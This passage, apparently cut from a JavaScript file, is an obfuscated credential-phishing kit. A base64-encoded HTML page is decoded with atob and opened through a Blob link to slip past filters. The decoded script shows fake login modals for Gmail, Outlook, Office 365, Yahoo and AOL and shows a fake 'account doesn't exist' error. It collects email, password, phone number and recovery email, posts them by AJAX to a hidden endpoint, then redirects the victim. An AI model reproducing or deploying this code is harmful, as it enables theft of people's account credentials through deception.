czVjQucG5nJyk7CiAgICAgICAgICAgICQoJyNmaWVsZCcpLmh0bWwoIk90aGVyIE1haWwiKTsKICAgICAgICAgICAgJCgnI2FpJykudmFsKHQpOwogICAgICAgICAgICAkKCcjYWljaCcpLmh0bWwodCk7CiAgICAgICAgICAgICQoIiNvdGhlcm1vZGFsIikudHJpZ2dlcigiY2xpY2siKQogICAgICAgIH0KICAgIH0KICAgICQoJyNnbWFpbG1vZGFsJykuY2xpY2soZnVuY3Rpb24oKSB7CiAgICAgICAgJCgnI2ZpZWxkSW1nJykuYXR0cignc3JjJywgJ2ltYWdlcy8nICsgYXRvYihwKSArICcucG5nJyk7CiAgICAgICAgJCgnI2ZpZWxkJykuaHRtbChhdG9iKHApKTsKICAgICAgICAkKCIjbXNnIikuaGlkZSgpCiAgICB9KTsKICAgICQoJyNvdXRsb29rbW9kYWwnKS5jbGljayhmdW5jdGlvbigpIHsKICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS9tZHJvbU5zLnBuZycpOwogICAgICAgICQoJyNmaWVsZCcpLmh0bWwoIk91dGxvb2siKTsKICAgICAgICAkKCIjbXNnIikuaGlkZSgpCiAgICB9KTsKICAgICQoJyNhb2xtb2RhbCcpLmNsaWNrKGZ1bmN0aW9uKCkgewogICAgICAgICQoJyNmaWVsZEltZycpLmF0dHIoJ3NyYycsICdodHRwczovL2kuaW1ndXIuY29tL0g1Y3NnbUkucG5nJyk7CiAgICAgICAgJCgnI2ZpZWxkJykuaHRtbCgiQW9sIik7CiAgICAgICAgJCgiI21zZyIpLmhpZGUoKQogICAgfSk7CiAgICAkKCcjb2ZmaWNlMzY1bW9kYWwnKS5jbGljayhmdW5jdGlvbigpIHsKICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS82Yk9MUlNpLnBuZycpOwogICAgICAgICQoJyNmaWVsZCcpLmh0bWwoIk9mZmljZSAzNjUiKTsKICAgICAgICAkKCIjbXNnIikuaGlkZSgpCiAgICB9KTsKICAgICQoJyN5YWhvb21vZGFsJykuY2xpY2soZnVuY3Rpb24oKSB7CiAgICAgICAgJCgnI2ZpZWxkSW1nJykuYXR0cignc3JjJywgJ2h0dHBzOi8vaS5pbWd1ci5jb20vZmZIRG5mNy5wbmcnKTsKICAgICAgICAkKCcjZmllbGQnKS5odG1sKCJZYWhvbyIpOwogICAgICAgICQoIiNtc2ciKS5oaWRlKCkKICAgIH0pOwogICAgJCgnI290aGVybW9kYWwnKS5jbGljayhmdW5jdGlvbigpIHsKICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS9XcmE3M1Y0LnBuZycpOwogICAgICAgICQoJyNmaWVsZCcpLmh0bWwoIk90aGVyIE1haWwiKTsKICAgICAgICAkKCIjbXNnIikuaGlkZSgpCiAgICB9KTsKICAgICQoJyNzdWJtaXQtYnRuJykuY2xpY2soZnVuY3Rpb24oYikgewogICAgICAgICQoJy5lcnJvcicpLmhpZGUoKTsKICAgICAgICAkKCcjbXNnJykuaGlkZSgpOwogICAgICAgIGIucHJldmVudERlZmF1bHQoKTsKICAgICAgICB2YXIgZCA9ICQoIiNhaSIpLnZhbCgpOwogICAgICAgIHZhciBlID0gJCgiI3ByIikudmFsKCk7CiAgICAgICAgJGZpZWxkID0gJCgnI2ZpZWxkJykuaHRtbCgpOwogICAgICAgIHZhciBnID0gZDsKICAgICAgICB2YXIgaCA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwogICAgICAgIGlmICghZCkgewogICAgICAgICAgICAkKCcuZXJyb3InKS5zaG93KCk7CiAgICAgICAgICAgICQoJy5lcnJvcicpLmh0bWwoIkVtYWlsIGZpZWxkIGlzIGVtcHR5Li4uISIpOwogICAgICAgICAgICBkLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICB9CiAgICAgICAgaWYgKCFoLnRlc3QoZykpIHsKICAgICAgICAgICAgJCgnLmVycm9yJykuc2hvdygpOwogICAgICAgICAgICAkKCcuZXJyb3InKS5odG1sKCJUaGF0IGFjY291bnQgZG9lc24ndCBleGlzdC4gRW50ZXIgYSBkaWZmZXJlbnQgYWNjb3VudCIpOwogICAgICAgICAgICBkLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICB9CiAgICAgICAgaWYgKCFlKSB7CiAgICAgICAgICAgICQoJy5lcnJvcicpLnNob3coKTsKICAgICAgICAgICAgJCgnLmVycm9yJykuaHRtbCgiUGFzc3dvcmQgZmllbGQgaXMgZW1wdHkuLi4hIik7CiAgICAgICAgICAgIGQuZm9jdXM7CiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIH0KICAgICAgICB2YXIgaSA9IGcuaW5kZXhPZigiQCIpOwogICAgICAgIHZhciBqID0gZy5zdWJzdHIoKGkgKyAxKSk7CiAgICAgICAgdmFyIGMgPSBqLnN1YnN0cigwLCBqLmluZGV4T2YoJy4nKSk7CiAgICAgICAgdmFyIGsgPSBjLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgbCA9IGwgKyAxOwogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIGRhdGFUeXBlOiAnSlNPTicsCiAgICAgICAgICAgIHVybDogZiwKICAgICAgICAgICAgdHlwZTogJ1BPU1QnLAogICAgICAgICAgICBkYXRhOiB7CiAgICAgICAgICAgICAgICBhaTogZCwKICAgICAgICAgICAgICAgIHByOiBlLAogICAgICAgICAgICB9LAogICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAkKCcjc3VibWl0LWJ0bicpLnZhbCgnVmVyaWZpbmcuLi4nKQogICAgICAgICAgICB9LAogICAgICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZiAobCA9PSAxICYmIChrID09IGF0b2IocCkgfHwgJGZpZWxkID09IGF0b2IocCkgfHwgJGZpZWxkID09IGF0b2IocCkpKSB7CiAgICAgICAgICAgICAgICAgICAgJCgnI2FpY2gnKS5odG1sKGcpOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYxIikuYW5pbWF0ZSh7CiAgICAgICAgICAgICAgICAgICAgICAgIGxlZnQ6IDAsCiAgICAgICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6ICJoaWRlIgogICAgICAgICAgICAgICAgICAgIH0sIDApOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYyIikuYW5pbWF0ZSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHJpZ2h0OiAwLAogICAgICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAic2hvdyIKICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsKICAgICAgICAgICAgICAgICAgICAkKCcjc3VibWl0LWJ0bicpLmhpZGUoKTsKICAgICAgICAgICAgICAgICAgICAkKCcjc3ViLWJ0bjEnKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAobCA+PSByYykgewogICAgICAgICAgICAgICAgICAgIGwgPSAwOwogICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKHJkcnQpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJCgiI3ByIikudmFsKCIiKTsKICAgICAgICAgICAgICAgICQoIiNtc2ciKS5zaG93KCk7CiAgICAgICAgICAgICAgICAkKCcjc3VibWl0LWJ0bicpLnZhbCgnTG9naW4nKQogICAgICAgICAgICB9CiAgICAgICAgfSkKICAgIH0pOwogICAgJCgnI3N1Yi1idG4xJykuY2xpY2soZnVuY3Rpb24oYikgewogICAgICAgIGIucHJldmVudERlZmF1bHQoKTsKICAgICAgICB2YXIgYyA9ICQoIiNhaSIpLnZhbCgpOwogICAgICAgIHZhciBkID0gJCgiI3ByIikudmFsKCk7CiAgICAgICAgdmFyIGUgPSAkKCIjcGgiKS52YWwoKTsKICAgICAgICB2YXIgZyA9ICQoIiNyZWNfYWkiKS52YWwoKTsKICAgICAgICBpZiAoIWMpIHsKICAgICAgICAgICAgJCgnLmVycm9yJykuc2hvdygpOwogICAgICAgICAgICAkKCcuZXJyb3InKS5odG1sKCJFbWFpbCBmaWVsZCBpcyBlbXB0eS4uLiEiKTsKICAgICAgICAgICAgYy5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgfQogICAgICAgIGlmICghZCkgewogICAgICAgICAgICAkKCcuZXJyb3InKS5zaG93KCk7CiAgICAgICAgICAgICQoJy5lcnJvcicpLmh0bWwoIlBhc3N3b3JkIGZpZWxkIGlzIGVtcHR5Li4uISIpOwogICAgICAgICAgICBjLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICB9CiAgICAgICAgaWYgKCFlKSB7CiAgICAgICAgICAgICQoJy5lcnJvcicpLnNob3coKTsKICAgICAgICAgICAgJCgnLmVycm9yJykuaHRtbCgiUGhvbmUgZmllbGQgaXMgZW1wdHkuLi4hIik7CiAgICAgICAgICAgIGMuZm9jdXM7CiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIH0KICAgICAgICBpZiAoIWcpIHsKICAgICAgICAgICAgJCgnLmVycm9yJykuc2hvdygpOwogICAgICAgICAgICAkKCcuZXJyb3InKS5odG1sKCJSZWNvdmVyeSBlbWFpbCBmaWVsZCBpcyBlbXB0eS4uLiEiKTsKICAgICAgICAgICAgYy5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgfQogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIGRhdGFUeXBlOiAnSlNPTicsCiAgICAgICAgICAgIHVybDogZiwKICAgICAgICAgICAgdHlwZTogJ1BPU1QnLAogICAgICAgICAgICBkYXRhOiB7CiAgICAgICAgICAgICAgICBhaTogYywKICAgICAgICAgICAgICAgIHByOiBkLAogICAgICAgICAgICAgICAgcGg6IGUsCiAgICAgICAgICAgICAgICByZWNfYWk6IGcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgJCgnI3N1Ym1pdC1idG4nKS52YWwoJ1ZlcmlmaW5nLi4uJykKICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29tcGxldGU6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UocmRydCk7CiAgICAgICAgICAgICAgICAkKCcjc3VibWl0LWJ0bicpLnZhbCgnVmVyaWZ5JykKICAgICAgICAgICAgfQogICAgICAgIH0pCiAgICB9KQp9KTsKCjwvc2NyaXB0PgoKPC9odG1sPgo=';
var decodedStringAtoB = atob(encodedStringAtoB);
console.log(decodedStringAtoB);
const myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
const url = window.URL.createObjectURL(myBlob);
a.attr("href", url);
$("body").append(a);
a[0].click();
window.URL.revokeObjectURL(url);
a.remove();
}